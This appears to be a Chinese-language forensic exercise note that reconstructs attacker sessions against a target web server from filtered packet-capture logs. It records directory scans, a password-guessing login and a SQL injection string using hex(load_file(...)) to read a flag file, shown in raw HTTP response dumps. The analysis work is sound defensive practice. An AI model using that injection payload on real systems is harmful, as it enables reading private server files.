

## 代码

*现在全部使用split_data*

- datafilter.py: copyright@czy，按ip分割，文件名为对应ip；
- httpfilter.py: 读上一步文件，保留http的部分，存储文件"{}_http.json".format(ip)；
- serverfilter.py: 读上一步文件，保留对应靶机ip的部分，存储文件"{}_http_5th_httponly.json".format(ip)；
- successful_actions.py: 题目特定，读上一步文件，保留与入口事件相关的部分，第五题对应的入口事件为["zhangwei","load_data","etc/passwd",".DS_Store","flag"]。

## 攻击日志记录

11:

1. （准备动作）对靶机进行目录扫描，时间区间为2023.4.22，5:45:47-6:42:06，证据是在HTTP请求日志中集中出现GET请求，其中大部分出现404错误。

2. （失败动作）
   向http://10.0.0.5/发送通过file\_data携带了特殊HTML的请求（其中在对应位置包含select hex(load\_file('/var/www/html/flag\_8946e1ff1ee3e40f.php'))）。时间为05:45:48。

```
{"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 05:45:48 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1750", "http.content_length_header_tree": {"http.content_length": "1750"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "1", "http.time": "0.003725000", "http.request_in": "1435336", "http.response_for.uri": "http://10.0.0.5/", "Content-encoded entity body (gzip): 1750 bytes -> 7923 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>123',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>a</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td><td class='AutoNewline'>123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
```

3. （失败动作）
   向http://10.0.0.5/index.php发送相同请求，时间为06:08:40，被重定向到登录界面http://10.0.0.5/index.php/login/，时间为06:08:42。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 06:08:42 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1750", "http.content_length_header_tree": {"http.content_length": "1750"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "1", "http.time": "0.004754000", "http.request_in": "1514869", "http.response_for.uri": "http://10.0.0.5/index.php/login/", "Content-encoded entity body (gzip): 1750 bytes -> 7923 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>123',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*</td><td class='AutoNewline'>a</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td><td class='AutoNewline'>123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

12:

17:

25:

1. (成功动作)密码破解，第一次访问登录页面的时间为2023.4.23，15:31:50；在15:32:01使用正确密码成功登录。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sun, 23 Apr 2023 15:31:50 GMT", "http.response.line": "Content-Type: text/html; charset=utf-8\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.cache_control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "http.content_encoding": "gzip", "http.content_length_header": "598", "http.content_length_header_tree": {"http.content_length": "598"}, "http.connection": "Keep-Alive", "http.content_type": "text/html; charset=utf-8", "\\r\\n": "", "http.response": "1", "http.response_number": "4", "http.time": "0.003225000", "http.prev_request_in": "4392717", "http.request_in": "4392732", "http.next_request_in": "4393350", "http.next_response_in": "4393353", "http.response_for.uri": "http://10.0.0.5/login.php", "Content-encoded entity body (gzip): 598 bytes -> 1670 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"signin no-js\" lang=\"\">\n<head>\n\n    <meta charset=\"utf-8\">\n    <title>Login</title>\n\n    <link rel=\"stylesheet\" href=\"vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"css/animate.min.css\">\n\n\n    <link rel=\"stylesheet\" href=\"css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"css/main.css\">\n\n    <script src=\"vendor/modernizr.js\"></script>\n</head>\n\n<body class=\"bg-color center-wrapper\">\n    <div class=\"center-content\">\n        <div class=\"row\">\n            <div class=\"col-xs-10 col-xs-offset-1 col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4\">\n                <section class=\"panel panel-default\">\n                    <header class=\"panel-heading\">Sign in</header>\n                    <div class=\"bg-white user pd-md\">\n                        <form role=\"form\" action=\"login.php\" method=\"post\">\n                            <input name=\"username\" type=\"text\" class=\"form-control mg-b-sm\" placeholder=\"zhangwei\" autofocus>\n                            <input name=\"password\" type=\"password\" class=\"form-control\" placeholder=\"zhangwei***\">\n                            <div class=\"text-right mg-b-sm mg-t-sm\"></div>\n                            <button class=\"btn btn-info btn-block\" type=\"submit\">Sign in</button>\n                        </form>\n                    </div>\n                </section>\n            </div>\n        </div>\n    </div>\n</body>\n</html>\n"}
   ```

2. （成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串："1',content=(select hex(load\_file('/var/www/html/flag\_8946e1ff1ee3e40f.php'))),/*"。该动作时间为15:32:11。
   之后重新查看留言获得flag。

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sun, 23 Apr 2023 15:32:11 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1711", "http.content_length_header_tree": {"http.content_length": "1711"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "8", "http.time": "0.003510000", "http.prev_request_in": "4393940", "http.prev_response_in": "4393944", "http.request_in": "4393955", "http.next_request_in": "4394027", "http.next_response_in": "4394030", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1711 bytes -> 7459 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>1',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td><td class='AutoNewline'>1</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

26:

1. （准备动作）对靶机进行目录扫描，标志是集中出现大大量文件名有序排列的GET请求。时间区间为2023.4.22，13:48:32-13:49:27。

2. （成功动作）密码破解，第一次访问登录页面的时间为17:53:24；在17:55:21使用正确密码成功登录。此后一段时间重新登录了2次，最后一次在18:07:02，后续的成功攻击动作在之后发生。

   (最后一次对应的日志：)

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sat, 22 Apr 2023 18:07:02 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1531", "http.content_length_header_tree": {"http.content_length": "1531"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "79101", "http.time": "0.002988000", "http.prev_request_in": "3201638", "http.request_in": "3201656", "http.next_request_in": "3203851", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1531 bytes -> 7060 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link 